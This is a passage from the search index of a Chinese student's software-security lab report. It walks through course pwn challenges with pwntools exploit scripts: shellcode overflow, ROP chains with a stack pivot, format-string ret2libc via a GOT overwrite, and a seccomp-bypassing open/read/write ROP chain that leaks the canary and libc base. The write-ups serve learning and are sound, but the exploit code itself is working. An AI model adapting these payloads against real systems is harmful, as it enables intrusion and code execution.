<pre><code>p.recvuntil(b\": \")\nbuffer_addr = p.recvline().decode().strip()\ninfo(f\"buffer_addr = {buffer_addr}\")\nbuffer_addr = p64(eval(buffer_addr))\n\nshellcode = asm(shellcraft.sh())\npayload = b\"\"\npayload += shellcode\npayload += b\"A\" * (0x80 + 8 - len(shellcode))\npayload += buffer_addr\n\ninfo(f\"payload = {payload}\")\np.sendline(payload)\np.interactive()\n</code></pre> <p>\u672c\u5730\u6d4b\u8bd5\uff1a</p> <p></p> <p>\u8fdc\u7a0b\u653b\u51fb\uff1a</p> <p></p>"},{"location":"sec/softsec/lab1/#rop","title":"ROP","text":""},{"location":"sec/softsec/lab1/#rop2","title":"rop2","text":"<p>\u68c0\u67e5\u4fdd\u62a4\uff0c\u5f00\u542f\u4e86 NX\uff0c\u7531\u4e8e\u7a0b\u5e8f\u662f\u9759\u6001\u94fe\u63a5\uff0c\u94fe\u63a5\u7684\u5e93\u4e2d\u5305\u542b\u4e86 canary\uff0c\u4f46\u5b9e\u9645\u4e0a\u7a0b\u5e8f\u672c\u8eab\u5e76\u6ca1\u6709\u5f00\u542f canary\uff0c\u53ef\u4ee5\u6b63\u5e38\u6808\u6ea2\u51fa\u3002</p> <p>\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u540e\u95e8\uff0c\u4e0d\u8fc7\u6267\u884c\u7684\u662f /bin/ls\uff0c\u540c\u65f6\u4e5f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u9759\u6001\u7684 /bin/sh \u5b57\u7b26\u4e32\u3002\u7531\u4e8e\u7a0b\u5e8f\u662f\u9759\u6001\u94fe\u63a5\uff0c\u800c\u4e14\u6ca1\u6709\u5f00\u542f PIE\uff0c\u6240\u4ee5\u76f4\u63a5\u6784\u9020 ROP \u94fe\u76f4\u63a5\u8c03\u7528\u7a0b\u5e8f\u5185\u7684 system \u5373\u53ef\u3002</p> <p>\u9996\u5148\u9700\u8981 0x50 + 8\uff08saved rbp\uff09\u4e2a\u5b57\u8282\u586b\u5145\u5230\u8fd4\u56de\u5730\u5740\uff0c\u7136\u540e\u8fd4\u56de\u5730\u5740\u4e0a\u63a5\u4e00\u6761 pop rdi; ret \u7684\u6307\u4ee4\u5730\u5740\uff0c\u63a5\u4e0b\u6765\u5e03\u5c40 gstr \u5b57\u7b26\u4e32\u7684\u5730\u5740\u4f7f\u4e4b pop \u5230 rdi\uff0c\u7136\u540e\u653e\u4e00\u4e2a system \u7684\u5730\u5740\u6765\u5b9e\u73b0\u8c03\u7528\u3002\u901a\u8fc7 ROPgadget \u627e\u5230 pop rdi; ret \u6307\u4ee4\uff1a</p> <pre><code>\u276f ROPgadget --binary rop2 | grep \"pop rdi ; ret\"\n0x0000000000459a98 : mov eax, 0xe8c78948 ; pop rdi ; ret\n0x0000000000459a97 : mov r8d, 0xe8c78948 ; pop rdi ; ret\n0x0000000000400716 : pop rdi ; ret\n0x00000000004a9f9d : pop rdi ; ret 0x22\n</code></pre> <p>\u6240\u4ee5\u4f7f\u7528 0x400716 \u4f4d\u7f6e\u5904\u7684 gadget \u5373\u53ef\uff1a</p> <pre><code>gstr_addr = elf.symbols[\"gstr\"]\nsystem = elf.symbols[\"system\"]\npop_rdi = 0x400716\n\npayload = b\"A\" * 0x58\npayload += p64(pop_rdi)\npayload += p64(gstr_addr)\npayload += p64(system)\npayload = payload + b\"B\" * (128 - len(payload))\nprint(f\"payload = {payload}\")\n\np.recvuntil(b\"[*] Please input the length of data:\\n\")\np.sendline(b\"128\")\np.recvuntil(b\"[*] Please input the data:\\n\")\np.send(payload)\n\np.interactive()\n</code></pre> <p>\u4f46\u5728\u8fd0\u884c\u7684\u65f6\u5019\u7ecf\u8fc7\u8c03\u8bd5\u4f1a\u5728 system \u51fd\u6570\u4e2d\u53d1\u751f\u6bb5\u9519\u8bef\uff0c\u9519\u8bef\u4f4d\u7f6e\u662f\u4e00\u6761 movaps \u6307\u4ee4\uff0c\u60f3\u8981\u8bbf\u95ee [rsp + 0x40]\uff1a</p> <p></p> <p>\u7ecf\u8fc7\u641c\u7d22\u4e86\u89e3\u5230 system \u5728\u6267\u884c\u7684\u65f6\u5019\u8981\u6c42 rsp 16 \u5b57\u8282\u5bf9\u9f50\uff0c\u5426\u5219\u4f1a\u51fa\u73b0\u6bb5\u9519\u8bef\u3002\u5982\u4e0a\u56fe\u6b64\u65f6 rsp \u672b\u5c3e\u4e3a 8\uff0c\u4e3a\u4e86\u8ba9\u5176\u53d8\u4e3a 0 \u53ea\u9700\u8981\u591a\u4e00\u6b21\u8df3\u8f6c\u5373\u5728 ROP \u94fe\u4e2d\u52a0\u4e00\u4e2a\u76f4\u63a5\u8df3\u8f6c\u7684\u6307\u4ee4\u5730\u5740\u5c31\u53ef\u4ee5\u4e86\uff1a</p> <pre><code>gstr_addr = elf.symbols[\"gstr\"]\nsystem = elf.symbols[\"system\"]\npop_rdi = 0x400716\nret     = 0x400bf5\n\npayload = b\"A\" * 0x58\npayload += p64(pop_rdi)\npayload += p64(gstr_addr)\npayload += p64(ret)         # align rsp\npayload += p64(system)\npayload = payload + b\"B\" * (128 - len(payload))\n</code></pre> <p>\u8fdc\u7a0b\uff1a</p> <p></p>"},{"location":"sec/softsec/lab1/#rop3","title":"rop3","text":"<p>\u8fd9\u9053\u9898\u76ee\u9650\u5236\u4e86 buffer \u7684\u8bfb\u5165\u957f\u5ea6\u6700\u591a\u6ea2\u51fa 0x10\uff0c\u5373\u4e00\u4e2a saved rbp \u4e00\u4e2a\u8fd4\u56de\u5730\u5740\u3002\u4f46\u63d0\u4f9b\u4e86\u5916\u90e8\u7684\u5168\u5c40\u53d8\u91cf gbuffer \u4e5f\u53ef\u4ee5\u8fdb\u884c\u5199\u5165\u3002\u6240\u4ee5\u8981\u5728 buffer \u6808\u6ea2\u51fa\u7684\u65f6\u5019\u5b9e\u73b0\u6808\u8fc1\u79fb\uff0c\u5c06 rbp rsp \u8f6c\u79fb\u5230 gbuffer \u4e2d\uff0c\u7136\u540e\u5728 gbuffer \u4e2d\u7ee7\u7eed ROP \u94fe\u8c03\u7528 system\u3002</p> <p>\u8fdb\u884c\u6808\u8fc1\u79fb\u9700\u8981 leave; ret \u6307\u4ee4\uff0c\u9996\u5148\u76ee\u6807\u51fd\u6570\u4f1a\u6267\u884c\u81ea\u5df1\u7684 leave \u6307\u4ee4\u6765 mov rsp, rbp; pop rbp\uff0c\u8fd9\u91cc pop \u7684 rbp \u5c31\u662f\u6808\u4e0a\u5b58\u7684 saved rbp\uff0c\u662f\u53ef\u4ee5\u6ea2\u51fa\u8986\u76d6\u7684\uff0c\u53ef\u4ee5\u5c06\u5176\u8986\u76d6\u4e3a gbuffer \u5730\u5740\u3002\u63a5\u4e0b\u6765\u5728\u8fd4\u56de\u5730\u5740\u7684\u4f4d\u7f6e\u653e\u4e00\u6761 leave; ret\uff0c\u8fd9\u6837\u5c31\u4f1a\u7ee7\u7eed\u518d\u6267\u884c\u4e00\u6761 leave\uff0c\u8ba9 rsp \u53d8\u6210\u6211\u4eec\u4fee\u6539\u7684\u4f4d\u7f6e\uff0c\u518d pop \u4f1a\u4f7f\u5176 +8\uff0c\u540c\u65f6 rbp \u76f8\u5f53\u4e8e\u81ea\u8eab\u89e3\u5f15\u7528\u4e86\uff0c\u540e\u9762\u4e0d\u4f1a\u7528\u5230\uff0c\u4e5f\u5c31\u4e0d\u7528\u7ba1\u5b83\u3002</p> <p>\u6240\u4ee5\u5728 gbuffer \u4e2d\uff0c\u9700\u8981\u5199\u5165\u4e00\u4e2a /bin/sh \u4f9b\u540e\u9762\u4f7f\u7528\uff0c\u56e0\u4e3a\u5982\u524d\u9762\u7684\u64cd\u4f5c\uff0crsp \u4f1a\u5411\u540e\u504f\u79fb 8 \u5b57\u8282\uff0c\u8fd9\u516b\u5b57\u8282\u4e5f\u5c31\u662f gbuffer \u5f00\u5934\u76f4\u63a5\u653e /bin/sh\\x00 \u5373\u53ef\u3002\u63a5\u4e0b\u6765 pop rdi; ret\uff0c\u7136\u540e\u653e\u4e00\u4e2a gbuffer \u5730\u5740\uff0c\u518d\u653e\u4e00\u4e2a system \u5730\u5740\u5373\u53ef\u3002\u540c\u65f6\u8fd8\u8981\u6ce8\u610f\u5bf9\u9f50 rsp\uff1a</p> <pre><code>\"\"\"\n\u276f ROPgadget --binary rop3 | grep \": leave\"\n0x0000000000400700 : leave ; ret\n\u276f ROPgadget --binary rop3 | grep \": pop rdi ; ret\"\n0x0000000000400823 : pop rdi ; ret\n\u276f ROPgadget --binary rop3 | grep \": ret\"\n0x0000000000400586 : ret\n\"\"\"\np.recvuntil(\"gift system address: \")\nsystem = eval(p.recvline().decode().strip())\ngbuffer = elf.symbols[\"gbuffer\"]\n\nleave_ret = 0x400700\npop_rdi   = 0x400823\nret       = 0x400586\npayload = b\"/bin/sh\\x00\"\npayload += p64(pop_rdi)\npayload += p64(gbuffer)\npayload += p64(ret)\npayload += p64(system)\nprint(f\"payload = {payload}\")\np.sendline(payload)\n\npayload = b\"A\" * 0x40\npayload += p64(gbuffer)\npayload += p64(leave_ret)\nprint(f\"payload = {payload}\")\np.sendafter(b\"&gt; \", payload)\n\np.interactive()\n</code></pre> <p></p>"},{"location":"sec/softsec/lab1/#fsb","title":"FSB","text":""},{"location":"sec/softsec/lab1/#demo","title":"demo","text":"<p>\u8fd9\u91cc\u8981\u5229\u7528 pwntools \u63d0\u4f9b\u7684 fmtstr \u76f8\u5173\u5de5\u5177\u5b9e\u73b0\u81ea\u52a8\u7684\u4efb\u610f\u5730\u5740\u5199 payload \u6784\u9020\u3002\u9996\u5148\u4f7f\u7528 FmtStr \u6765\u7206\u7834 offset\uff0c\u56e0\u4e3a\u7a0b\u5e8f\u53ea\u6709\u4e00\u6b21\u8f93\u5165\u8f93\u51fa\uff0c\u6240\u4ee5\u6bcf\u6b21\u6d4b\u8bd5\u8981\u65b0\u5efa\u8fdb\u7a0b\uff1a</p> <pre><code>def exec_fmt(payload):\n    info(f\"finding offset... payload = {payload}\")\n    p = process(elf_path)\n    p.sendline(payload)\n    res = p.recv()\n    info(f\"finding offset... res = {res}\")\n    p.close()\n    return res\n\nfsb = FmtStr(exec_fmt)\noffset = fsb.offset\n</code></pre> <p>\u63a5\u4e0b\u6765\u4f7f\u7528 fmtstr_payload \u6784\u9020 payload \u5373\u53ef\uff0c\u9ed8\u8ba4\u7684 write_size \u9010\u5b57\u8282\u5199\u5165\uff0c\u5bfc\u81f4 payload \u592a\u957f\u65e0\u6cd5\u5168\u90e8\u8f93\u5165\uff0c\u9700\u8981\u8bbe\u7f6e\u5176\u4e3a short\uff1a</p> <pre><code>var_addr = elf.symbols[\"var\"]\npayload = fmtstr_payload(offset, {var_addr: &lt;\u6570\u636e\u5220\u9664&gt;}, write_size=\"short\")\ninfo(f\"payload = {payload}, len = {len(payload)}\")\n\np = process(elf_path)\np.sendline(payload)\nres = p.recvall()\nsuccess(res[res.find(b\"var = \"):].decode().strip())\n</code></pre> <p></p> <p>\u53ef\u4ee5\u770b\u51fa FmtStr \u5f97\u5230\u4e86 offset \u4e3a 6\uff0c\u7136\u540e\u6784\u9020\u4e86 payload\uff0c\u4e4b\u540e\u7a0b\u5e8f\u4e2d\u8f93\u51fa\u7684 var \u53d8\u91cf\u7684\u503c\u53d8\u6210\u4e86 &lt;\u6570\u636e\u5220\u9664&gt; \u5373\u5b66\u53f7 &lt;\u6570\u636e\u5220\u9664&gt;\u3002</p>"},{"location":"sec/softsec/lab1/#echo","title":"echo","text":"<p>\u9898\u76ee\u8fdb\u884c\u4e86\u4e09\u6b21\u8f93\u5165\u53ca printf \u8f93\u51fa\uff0c\u9664\u6b64\u4e4b\u5916\u6ca1\u6709\u540e\u95e8\u4ec0\u4e48\u7684\uff0c\u7ed9\u4e86 libc.\u200cso\uff0c\u8981\u5b9e\u73b0 ret2libc \u653b\u51fb\u3002</p> <p>\u53ea\u6709\u4e09\u6b21\u8f93\u5165\u8f93\u51fa\u673a\u4f1a\uff0c\u6240\u4ee5\u8fd9\u4e09\u6b21\u7684\u76ee\u6807\u5206\u522b\u662f\uff1a</p> <ol> <li>\u901a\u8fc7\u4efb\u610f\u5730\u5740\u8bfb\u8bfb\u53d6 printf GOT \u8868\u4e2d\u5730\u5740<ul> <li>\u8fd9\u91cc\u5c31\u662f printf \u7684\u5b9e\u9645\u52a0\u8f7d\u5730\u5740</li> <li>\u7531\u6b64\u53ef\u4ee5\u6839\u636e libc.\u200cso \u4e2d\u76f8\u5bf9\u4f4d\u7f6e\u8ba1\u7b97\u51fa system \u7684\u52a0\u8f7d\u5730\u5740</li> </ul> </li> <li>\u901a\u8fc7\u4efb\u610f\u5730\u5740\u5199\u5c06 printf GOT \u8868\u4e2d\u5730\u5740\u8986\u76d6\u4e3a system \u7684\u5730\u5740<ul> <li>\u8fd9\u65f6\u4e0b\u4e00\u6b21\u8c03\u7528 printf \u5c31\u4f1a\u6267\u884c system</li> </ul> </li> <li>\u8f93\u5165 /bin/sh\uff0c\u89e6\u53d1 system(\"/bin/sh\")</li> </ol> <p>\u7b2c\u4e00\u6b65\u6839\u636e\u8c03\u8bd5\uff0cpadding \u5230 128 \u5b57\u8282\u7684\u60c5\u51b5\u4e0b\u6700\u540e\u516b\u4e2a\u5b57\u8282\uff08\u5b58\u653e printf GOT \u5730\u5740\uff09\u7684\u53c2\u6570\u504f\u79fb\u4e3a 23\uff0c\u6240\u4ee5 payload \u5c31\u662f %23$sAAAAA...AAA&lt;addr&gt;\u3002\u63a5\u4e0b\u6765\u7b2c\u4e8c\u6b65\u4f7f\u7528 fmtstr_payload\uff0c\u7b2c\u4e09\u6b65\u76f4\u63a5\u8f93\u5165\u5c31\u53ef\u4ee5\u4e86\uff1a</p> <pre><code>offset = 8\n\ndef padding(s, length, remain):\n    return s + (length - len(s) - remain) * b\"A\"\n\nprintf_got = elf.got[\"printf\"]\npayload = b\"%23$s\"\npayload = padding(payload, 128, 8)\npayload += p64(printf_got)\ninfo(f\"payload = {payload}\")\np.send(payload)\n\nrecv = p.recv()\nprintf_addr = u64(recv[:6]+b\"\\x00\\x00\")\nsystem_addr = printf_addr - (libc.symbols[\"printf\"] - libc.symbols[\"system\"])\ninfo(f\"printf_addr = {hex(printf_addr)}\")\ninfo(f\"system_addr = {hex(system_addr)}\")\npayload = fmtstr_payload(offset, {printf_got: system_addr}, write_size=\"short\")\ninfo(f\"payload = {payload}\")\n\np.send(payload)\np.send(b\"/bin/sh\\0\")\np.interactive()\n</code></pre> <p></p>"},{"location":"sec/softsec/lab1/#bonus","title":"Bonus","text":"<p>IDA \u9006\u5411\u53ef\u4ee5\u770b\u5230 main \u51fd\u6570\u7684\u5f00\u5934\u8fdb\u884c\u4e86\u4e24\u6b21\u7cfb\u7edf\u8c03\u7528\uff1a</p> <pre><code>...\n  syscall(157LL, 38LL, 1LL, 0LL, 0LL, 0LL);\n  syscall(317LL, 1LL, 0LL, &amp;v6);\n  for ( i = 0LL; i &lt;= 3; ++i )\n  {\n    memset(s, 0, 0x100uLL);\n    printf(\"size&gt; \");\n    read(0, s, 0xFuLL);\n    v4 = atoi(s);\n    if ( v4 &lt;= 256 )\n    {\n      memset(s, 0, 0x100uLL);\n      read(0, s, (unsigned __int16)v4);\n      puts(s);\n    }\n  }\n  return 0LL;\n}\n</code></pre> <p>\u7b2c\u4e00\u6b21\u8c03\u7528\u53f7 157 \u5bf9\u5e94 prctl\uff0c\u7b2c\u4e8c\u6b21 317 \u5bf9\u5e94 seccomp\uff0c\u6240\u4ee5\u8fd9\u91cc\u662f\u5728\u8bbe\u7f6e seccomp \u8fc7\u6ee4\u7cfb\u7edf\u8c03\u7528\uff0c\u901a\u8fc7 seccomp-tools \u53ef\u4ee5\u770b\u5230\u8fc7\u6ee4\u89c4\u5219\uff08\u53ea\u4fdd\u7559\u4e86 open read write\uff09\uff1a</p> <pre><code>\u276f seccomp-tools dump ./binary\nline  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0001: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0003\n 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0003: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0005\n 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0005: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0007\n 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0007: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS\n</code></pre> <p>\u63a5\u4e0b\u6765\u8fdb\u884c\u56db\u6b21\u8f93\u5165\u8f93\u51fa\uff0c\u6bcf\u6b21\u9700\u8981\u5148\u8f93\u5165\u957f\u5ea6 s\uff0c\u7136\u540e\u6bd4\u8f83\u5176\u548c 256 \u7684\u5927\u5c0f\uff0c\u5982\u679c\u518d\u5728 256 \u5185\u5219\u8bfb\u53d6\u5bf9\u5e94\u957f\u5ea6\u7684\u5185\u5bb9\u7136\u540e puts\u3002\u4f46\u662f\u8fd9\u91cc\u957f\u5ea6\u4e5f\u5c31\u662f v4 \u7684\u53d8\u91cf\u7c7b\u578b\u662f __int16\uff0c\u6240\u4ee5\u5982\u679c\u957f\u5ea6\u4e3a 0xffff \u5373 65535 \u5219 atoi \u7684\u65f6\u5019 v4 \u4f1a\u53d8\u6210 -1\uff0c\u7ed5\u8fc7\u957f\u5ea6\u68c0\u6d4b\uff0c\u7136\u540e\u8bfb\u53d6\u7684\u65f6\u5019\u7531\u4e8e\u5f3a\u8f6c\u4e86 unsigned\uff0c\u6240\u4ee5\u53ef\u4ee5\u8bfb\u53d6 65535 \u4e2a\u5b57\u8282\uff0c\u5b9e\u73b0\u6808\u6ea2\u51fa\u3002</p> <p>checksec \u53ef\u4ee5\u770b\u51fa\u6240\u6709\u5b89\u5168\u673a\u5236\u90fd\u662f\u5f00\u542f\u7684\uff0c\u6240\u4ee5\u9700\u8981\u4f7f\u7528\u4e00\u6b21\u8f93\u5165\u8f93\u51fa\u673a\u4f1a\u6765\u6cc4\u9732\u51fa canary\u3002\u7136\u540e\u9700\u8981\u4e00\u6b21\u8f93\u5165\u8f93\u51fa\u6765\u6cc4\u9732\u51fa\u8fd4\u56de\u5730\u5740\uff0c\u8fd9\u4e2a\u5730\u5740\u5c31\u662f libc.\u200cso \u91cc __libc_start_main \u51fd\u6570\u4e2d call main \u7684\u4e0b\u4e00\u6761\u5730\u5740\uff0c\u901a\u8fc7\u9006\u5411 libc.\u200cso \u53ef\u4ee5\u5f97\u5230\u8fd9\u91cc\u7684\u504f\u79fb\u4e3a 0x29d90\u3002\u6240\u4ee5\u53ef\u4ee5\u8ba1\u7b97\u51fa libc \u57fa\u5730\u5740\uff0c\u8fdb\u800c\u8ba1\u7b97\u51fa syscall \u5730\u5740\u3002</p> <p>\u5269\u4f59\u4e24\u6b21\u8f93\u5165\u8f93\u51fa\uff0c\u6700\u540e\u4e00\u6b21\u8981\u6784\u9020 ROP \u94fe\u8fdb\u884c /flag.txt \u7684\u8bfb\u53d6\uff0c\u6839\u636e\u524d\u9762\u9650\u5236\u7684 syscall\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c open\u3001read \u5230 buffer\uff0cwrite \u5230 stdout\u3002\u6240\u4ee5\u9700\u8981\u63d0\u4f9b\u4e00\u4e2a\u4f4d\u7f6e\u6765\u5b58\u653e \"/flag.txt\" \u4ee5\u53ca\u8bfb\u53d6\u7684\u5185\u5bb9\u3002\u8fd9\u91cc\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u8bfb\u5165\u7684 s \u6570\u7ec4\uff0c\u6240\u4ee5\u5012\u6570\u7b2c\u4e8c\u6b21\u5c31\u8981\u6cc4\u9732\u6808\u5730\u5740\u3002</p> <p>\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u64cd\u4f5c\u7cfb\u7edf\u5e03\u5c40\u597d argc argv envp \u7b49\u7136\u540e\u5728\u6808\u4e0a\u7ee7\u7eed\u6267\u884c _start \u51fd\u6570\uff0c\u5176\u4e2d\u518d\u8c03\u7528 libc \u5185\u7684 __libc_start_main\uff0c\u8c03\u7528\u524d\u6808\u7684\u5e03\u5c40\u7c7b\u4f3c\u4e3a\uff08\u4ee5\u4e0b\u4e3a\u4f7f\u7528\u672c\u5730 libc \u9759\u6001\u94fe\u63a5\u7684\u7b80\u5355\u7a0b\u5e8f\u7684\u8c03\u8bd5\u7ed3\u679c\uff09\uff1a</p> <pre><code>00:0000\u2502 rsp 0x7fffffffe3c0 \u2014\u25b8 0x7fffffffe3c8 \u25c2\u2014 0x0\n01:0008\u2502     0x7fffffffe3c8 \u25c2\u2014 0x0\n02:0010\u2502     0x7fffffffe3d0 \u25c2\u2014 0x1\n03:0018\u2502 rdx 0x7fffffffe3d8 \u2014\u25b8 0x7fffffffe682 \u25c2\u2014 argv[0]\n04:0020\u2502     0x7fffffffe3e0 \u25c2\u2014 0x0\n05:0028\u2502     0x7fffffffe3e8 \u2014\u25b8 0x7fffffffe68d \u25c2\u2014 envp[0]\n...\n</code></pre> <p>\u7d27\u63a5\u7740 __libc_start_main \u5185\u4f1a\u8fdb\u884c\u4e00\u4e9b push \u7136\u540e\u6784\u9020\u5b83\u81ea\u5df1\u7684\u5e27\u6808\uff0c\u76f4\u5230\u8c03\u7528 main \u4e4b\u524d\uff0c\u6808\u5e03\u5c40\u4f1a\u53d8\u6210\u7c7b\u4f3c\uff1a</p> <pre><code>00:0000\u2502 rbp rsp 0x7fffffffe2b0 \u2014\u25b8 0x4018a0 (__libc_csu_init)\n01:0008\u2502         0x7fffffffe2b8 \u2014\u25b8 0x401139 (__libc_start_main+777)\n02:0010\u2502         0x7fffffffe2c0 \u25c2\u2014 0x0\n03:0018\u2502         0x7fffffffe2c8 \u25c2\u2014 0x100000000\n04:0020\u2502         0x7fffffffe2d0 \u2014\u25b8 0x7fffffffe3d8 \u2014\u25b8 0x7fffffffe682 \u25c2\u2014 argv[0]\n05:0028\u2502         0x7fffffffe2d8 \u2014\u25b8 0x400b6d (main)\n06:0030\u2502         0x7fffffffe2e0 \u25c2\u2014 0x0\n07:0038\u2502         0x7fffffffe2e8 \u25c2\u2014 0x5500000006\n</code></pre> <p>\u6240\u4ee5\u53ef\u4ee5\u63a5\u7740\u6ea2\u51fa\u4f7f\u4e4b\u8f93\u51fa\u6808\u4e0a\u7684 argv \u5730\u5740\uff0c\u5b83\u5bf9\u5e94\u7684\u4f4d\u7f6e\u662f\u5728 __libc_start_main \u7684\u5e27\u6808\u4e4b\u524d\u7684\uff0c\u4e5f\u5c31\u662f\u524d\u9762\u8bf4\u5230\u7684\u7cfb\u7edf\u5e03\u5c40 argv \u7684\u5730\u5740\uff0c\u4e2d\u95f4\u7684\u8fd9\u4e9b\u6808\u7684\u53d8\u5316\u90fd\u53ef\u4ee5\u901a\u8fc7\u9006\u5411 libc.\u200cso \u5f97\u5230\uff0c\u6700\u7ec8\u53ef\u4ee5\u8ba1\u7b97\u5f97\u51fa\u8fd9\u4e2a\u5730\u5740 - 0x228 \u5373\u4e3a main \u51fd\u6570\u5e27\u6808\u5185 s \u7684\u5730\u5740\u3002</p> <p>\u63a5\u4e0b\u6765\u6784\u9020 ROP \u94fe\uff0c\u56e0\u4e3a\u7ed9\u4e86 libc.\u200cso\uff0c\u6240\u4ee5\u5728\u8fd9\u91cc\u5bfb\u627e gadget \u66f4\u65b9\u4fbf\uff0c\u56e0\u4e3a\u8981\u8fdb\u884c\u7684\u4e09\u6b21 syscall \u5206\u522b\u4e3a\uff1a</p> <pre><code>syscall(2, s, 0); // syscall(SYS_open, \"/flag.txt\", O_RDONLY)\nsyscall(0, fd, s+0x10, len); // syscall(SYS_read, fd, s+0x10, len) \u8fd9\u91cc\u7684 fd \u4e0d\u786e\u5b9a\uff0c\u53ef\u4ee5\u4ece 3 \u5f00\u59cb\u679a\u4e3e\nsyscall(1, 1, s+0x10, len); // syscall(SYS_write, stdout, s+0x10, len)\n</code></pre> <p>\u6240\u4ee5\u9700\u8981\u5e03\u5c40\u56db\u4e2a\u53c2\u6570\uff08rdi rsi rdx rcx\uff09\uff0c\u5bfb\u627e gadget:</p> <pre><code>\u276f ROPgadget --binary libc.so | grep \": pop rdi ; ret\"\n0x000000000002a3e5 : pop rdi ; ret\n\u276f ROPgadget --binary libc.so | grep \": pop rsi ; ret\"\n0x000000000002be51 : pop rsi ; ret\n\u276f ROPgadget --binary libc.so | grep \": pop rdx ; ret\"\n0x000000000003bad3 : pop rdx ; retf 0x19\n\u276f ROPgadget --binary libc.so | egrep \": pop rdx ; .*? ; ret\"\n...\n0x0000000000090529 : pop rdx ; pop rbx ; ret\n\u276f ROPgadget --binary libc.so | grep \": pop rcx ; ret\"\n0x000000000008c6bb : pop rcx ; ret\n</code></pre> <p>\u4e4b\u540e\u6839\u636e\u8fd9\u4e9b\u76ee\u6807\u7f16\u5199 exp \u5373\u53ef\uff1a</p> <ol> <li>\u6cc4\u9732 canary     <pre><code>p.sendafter(b\"size&gt; \", b\"65535\".ljust(0xf, b\"\\x00\"))\np.send(b\"A\" * 0x109)\np.recvn(0x109)\ncanary = u64(b\"\\x00\" + p.recvn(7))\ninfo(f\"canary: {hex(canary)}\")\n</code></pre></li> <li>\u6cc4\u9732 libc \u57fa\u5730\u5740     <pre><code>p.sendafter(b\"size&gt; \", b\"65535\".ljust(0xf, b\"\\x00\"))\np.send(b\"A\" * 0x108 + b\"A\" * 8 + b\"A\" * 8)\np.recvn(0x118)\nret_addr = u64(p.recvn(6) + b\"\\x00\\x00\")\nlibc_base = ret_addr - 0x29d90\nsyscall_addr = libc_base + libc.symbols[\"syscall\"]\ninfo(f\"ret_addr: {hex(ret_addr)}\")\ninfo(f\"libc_base: {hex(libc_base)}\")\ninfo(f\"syscall_addr: {hex(syscall_addr)}\")\n</code></pre></li> <li>\u6cc4\u9732\u6808\u4e0a s \u5730\u5740     <pre><code>p.sendafter(b\"size&gt; \", b\"65535\".ljust(0xf, b\"\\x00\"))\np.send(b\"A\" * 0x108 + b\"A\" * (8 + 8 + 8 + 8 + 8 + 8))\np.recvn(0x138)\nstack_addr = u64(p.recvn(6) + b\"\\x00\\x00\")\nbuffer_addr = stack_addr - 0x228\ninfo(f\"stack_addr: {hex(stack_addr)}\")\ninfo(f\"buffer_addr: {hex(buffer_addr)}\")\n</code></pre></li> <li>\u6784\u9020 ROP payload<ul> <li>\u5199\u5165 \"/flag.txt\" \u5e76\u6ea2\u51fa\u3001\u586b\u5165 canary\uff0c\u8986\u76d6 rbp     <pre><code>payload = b\"/flag.txt\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\npayload += b\"A\" * (0x108 - len(payload))\npayload += p64(canary)\npayload += b\"A\" * 8\n</code></pre></li> <li>syscall open     <pre><code>pop_rdi_ret     = libc_base + 0x2a3e5\npop_rsi_ret     = libc_base + 0x2be51\npop_rdx_rbx_ret = libc_base + 0x90529\npop_rcx_ret     = libc_base + 0x8c6bb\n\npayload += p64(pop_rdi_ret)\npayload += p64(2) # open\npayload += p64(pop_rsi_ret)\npayload += p64(buffer_addr)\npayload += p64(pop_rdx_rbx_ret)\npayload += p64(0) # O_RDONLY\npayload += p64(0)\npayload += p64(syscall_addr)\n</code></pre></li> <li>syscall read     <pre><code>payload += p64(pop_rdi_ret)\npayload += p64(0) # read\npayload += p64(pop_rsi_ret)\npayload += p64(4) # fd\npayload += p64(pop_rdx_rbx_ret)\npayload += p64(buffer_addr + 0x10)\npayload += p64(0)\npayload += p64(pop_rcx_ret)\npayload += p64(0x40)\npayload += p64(syscall_addr)\n</code></pre></li> <li>syscall write     <pre><code>payload += p64(pop_rdi_ret)\npayload += p64(1) # write\npayload += p64(pop_rsi_ret)\npayload += p64(1) # fd\npayload += p64(pop_rdx_rbx_ret)\npayload += p64(buffer_addr + 0x10)\npayload += p64(0)\npayload += p64(pop_rcx_ret)\npayload += p64(64)\npayload += p64(syscall_addr)\n\np.sendafter(b\"size&gt; \", b\"65535\".ljust(0xf, b\"\\x00\"))\np.send(payload)\np.interactive()\n</code></pre></li> </ul> </li> </ol> <p>\u8fdc\u7a0b\uff1a</p> <p></p>"},{"location":"sec/softsec/lab2/","title":"\u57fa\u7840\u5806\u77e5\u8bc6\u3001\u6f0f\u6d1e\u4e0e\u5229\u7528","text":"<p> \u7ea6 1510 \u4e2a\u5b57  64 \u884c\u4ee3\u7801  13 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <p>Abstract</p> <p>\u8f6f\u4ef6\u5b89\u5168 lab2 \u5b9e\u9a8c\u62a5\u544a\uff082023.06.03 ~ 2023.06.19\uff09</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"sec/softsec/lab2/#_2","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>Challenge 1. test\uff0840 \u5206\uff09<ul> <li>\u5728\u5b9e\u9a8c\u62a5\u544a\u4e2d\u63d0\u4f9b\u622a\u56fe\u548c\u653b\u51fb\u4ee3\u7801\u8bc1\u660e\u5b8c\u6210\u5982\u4e0b\u76ee\u6807</li> <li>\u9488\u5bf9\u8981\u6c42\u7684\u4e24\u4e2a\u60c5\u5f62\uff08\u5f00\u542f tcache \u4ee5\u53ca\u672a\u5f00\u542f tcache\uff09\uff0c\u9488\u5bf9\u4e0d\u540c checkpoint \u8fdb\u884c\u622a\u56fe\u8c03\u8bd5\u4ee5\u53ca\u63cf\u8ff0\uff0820 \u5206\uff09</li> 